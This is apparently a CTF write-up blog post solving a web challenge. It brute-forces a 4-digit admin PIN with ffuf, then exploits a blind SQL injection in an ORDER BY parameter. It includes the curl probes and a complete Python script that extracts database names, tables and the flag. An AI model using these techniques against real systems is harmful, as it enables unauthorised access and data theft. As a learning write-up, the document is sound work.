---
layout: post
title:  "secureform-admin"
date:   2026-06-08 14:51:00 -0400
author: robo.uzi
tags: [CTF]
permalink: /Dal-CTF-2026-secureform-admin/
---

**Title**: secureform-admin

**Author**: Seneque - PolyPWN

**Category**: Web

**Description**: You've discovered the admin panel of a contact form application called **SecureForm**. Access is protected by a 4-digit PIN... but is it really secure?

Once inside, the dashboard lists form submissions and offers sorting options. The developer tried to mimic WordPress sanitization, but something slipped through.

Instance available at: `https://dalctf-secureform-admin-154-64616c.instancer.dalctf2026.com`

I go to the site:

![Alt text](/images/dalctfweb12.png)

There is a 4 digit pin I need to get in order to login. I test the site and there is no rate limiting or lock out policy. It should be easy. I run `seq -f "%04g" 0 9999 > nums.txt` to get a text file with all possible pins in it. Then run this ffuf command:
```shell
ffuf -w nums.txt -u https://dalctf-secureform-admin-154-64616c.instancer.dalctf2026.com/ -X POST -d "pin=FUZZ" -H "Content-Type: application/x-www-form-urlencoded" -H "Cookie: PHPSESSID=9c9fd31bac3b10e471fe6836992310ae" -fs 1966
```

I let it run for a while, then I start getting 302s:
```shell
7392               [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 316ms]  
7393               [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 313ms]  
7394               [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 312ms]  
7395               [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 308ms]  
7396               [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 306ms]
```

My pin is `7392`. I login and now Im on `https://dalctf-secureform-admin-154-64616c.instancer.dalctf2026.com/dashboard.php`: 

![Alt text](/images/dalctfweb10.png)

I can add an entry like this:
```http
POST /dashboard.php HTTP/1.1
Host: dalctf-secureform-admin-154-64616c.instancer.dalctf2026.com
Cookie: PHPSESSID=9c9fd31bac3b10e471fe6836992310ae
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://dalctf-secureform-admin-154-64616c.instancer.dalctf2026.com/dashboard.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 63
Origin: https://dalctf-secureform-admin-154-64616c.instancer.dalctf2026.com
Dnt: 1
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
Connection: keep-alive

action=add_entry&name=test&email=email%40email.com&message=test
```

Entry added:

![Alt text](/images/dalctfweb11.png)

On `view-source:https://dalctf-secureform-admin-154-64616c.instancer.dalctf2026.com/dashboard.php` I find this:
```html
<div class="sort-controls">
	<span class="sort-label">Sort by:</span>
	<a href="?orderby=id&order=ASC" class="sort-btn ">ID ↑</a>
	<a href="?orderby=id&order=DESC" class="sort-btn ">ID ↓</a>
	<a href="?orderby=submission_time&order=ASC" class="sort-btn ">Time ↑</a>
	<a href="?orderby=submission_time&order=DESC" class="sort-btn active">Time ↓</a>
	<a href="?orderby=name&order=ASC" class="sort-btn ">Name ↑</a>
</div>
```

In the description they mention `WordPress sanitization`. This looks possible similar to [CVE-2021-24758](https://cvefeed.io/vuln/detail/CVE-2021-24758). 

I decide to test for SQLi in the link. First I sent `IF(1=1,id,(SELECT 1 UNION SELECT 2))`:
```shell
curl -k "https://dalctf-secureform-admin-154-64616c.instancer.dalctf2026.com/dashboard.php?orderby=IF%281%3D1%2Cid%2C%28SELECT%201%20UNION%20SELECT%202%29%29&order=ASC" -H "Cookie: PHPSESSID=9c9fd31bac3b10e471fe6836992310ae" | grep -c "alert-error" % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 100 5120 0 5120 0 0 19826 0 --:--:-- --:--:-- --:--:-- 19844 
0
```

Then I send `IF(1=2,id,(SELECT 1 UNION SELECT 2))`:
```shell
curl -k "https://dalctf-secureform-admin-154-64616c.instancer.dalctf2026.com/dashboard.php?orderby=IF%281%3D2%2Cid%2C%28SELECT%201%20UNION%20SELECT%202%29%29&order=ASC" -H "Cookie: PHPSESSID=9c9fd31bac3b10e471fe6836992310ae" | grep -c "alert-error" % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 100 4103 0 4103 0 0 14460 0 --:--:-- --:--:-- --:--:-- 14498 
1
```

Ok I have a reliable boolean oracle `IF(condition, id, (SELECT 1 UNION SELECT 2))`: `true` > no error page, `false` > error page.

I can use this for blind sql injection. The injection works because the `orderby` parameter is inserted directly into the `ORDER BY` clause.

After some time I get a python script working which will enumerate out the parts of the database that I need!

Solve script:
```python
#!/usr/bin/env python3
import requests
import sys

URL = "https://dalctf-secureform-admin-154-64616c.instancer.dalctf2026.com/dashboard.php"
COOKIE = {"PHPSESSID": "9c9fd31bac3b10e471fe6836992310ae"}
VERIFY_SSL = True

def is_true(condition: str) -> bool:
    payload = f"IF({condition}, id, (SELECT 1 UNION SELECT 2))"
    resp = requests.get(URL, params={"orderby": payload, "order": "ASC"},
                        cookies=COOKIE, verify=VERIFY_SSL, timeout=10)
    return b"alert-error" not in resp.content

def get_length(query: str, max_guess=64) -> int:
    low, high = 1, max_guess
    while low <= high:
        mid = (low + high) // 2
        if is_true(f"LENGTH(({query})) > {mid}"):
            low = mid + 1
        else:
            if is_true(f"LENGTH(({query})) = {mid}"):
                return mid
            high = mid - 1
    return 0

def extract_string(query: str, length: int = None) -> str:
    if length is None:
        length = get_length(query)
        if length == 0:
            return ""
    result = ""
    for pos in range(1, length + 1):
        low, high = 32, 126
        while low <= high:
            mid = (low + high) // 2
            if is_true(f"ASCII(SUBSTR(({query}), {pos}, 1)) > {mid}"):
                low = mid + 1
            else:
                if is_true(f"ASCII(SUBSTR(({query}), {pos}, 1)) = {mid}"):
                    result += chr(mid)
                    break
                high = mid - 1
        else:
            if low == 32:
                result += ' '
            else:
                break
        sys.stdout.write(f"\rExtracting: {result}")
        sys.stdout.flush()
    print()
    return result

def extract_rows(query: str) -> list:
    count_q = f"SELECT COUNT(*) FROM ({query}) AS t"
    row_count = 0
    for cnt in range(1, 100):
        if is_true(f"({count_q}) = {cnt}"):
            row_count = cnt
            break
    print(f"Found {row_count} row(s)")
    rows = []
    for i in range(row_count):
        row_q = f"({query}) LIMIT {i},1"
        rows.append(extract_string(row_q))
    return rows

def main():
    print("Starting blind SQL injection enumeration")

    print("\nDatabase:")
    db = extract_string("SELECT DATABASE()")
    print(f"    => {db}")

    print("\nTables in current database:")
    tables_q = f"SELECT table_name FROM information_schema.tables WHERE table_schema='{db}'"
    tables = extract_rows(tables_q)
    print(f"    => {tables}")

    if not tables:
        print("No tables found. Exiting.")
        return

    # prioritize secrets table
    flag_table = next((t for t in tables if t.lower() in ('secrets', 'flag', 'flags')), tables[0])
    print(f"\nUsing table: {flag_table}")

    print(f"\nColumns in {flag_table}:")
    cols_q = f"SELECT column_name FROM information_schema.columns WHERE table_schema='{db}' AND table_name='{flag_table}'"
    columns = extract_rows(cols_q)
    print(f"    => {columns}")

    if not columns:
        print("No columns found. Exiting.")
        return

    flag_col = next((c for c in columns if c.lower() in ('flag', 'value', 'secret')), columns[0])
    print(f"\nUsing column: {flag_col}")

    print(f"\nData from {flag_table}.{flag_col}:")
    data_q = f"SELECT {flag_col} FROM {flag_table}"
    flag_values = extract_rows(data_q)
    print("\nFlag: ")
    for val in flag_values:
        print(f"    {val}")

if __name__ == "__main__":
    main()
```

Output:
```shell
python3 solve3.py  
Starting blind SQL injection enumeration  
  
Database:  
Extracting: ctf_challenge  
	=> ctf_challenge  
  
Tables in current database:  
Found 2 row(s)  
Extracting: entries  
Extracting: secrets  
	=> ['entries', 'secrets']  
  
Using table: secrets  
  
Columns in secrets:  
Found 2 row(s)  
Extracting: id  
Extracting: flag  
	=> ['id', 'flag']  
  
Using column: flag  
  
Data from secrets.flag:  
Found 1 row(s)  
Extracting: dalctf{bl1nd_sqli_0rd3r_by}  
  
Flag:  
	dalctf{bl1nd_sqli_0rd3r_by}
```

`dalctf{bl1nd_sqli_0rd3r_by}`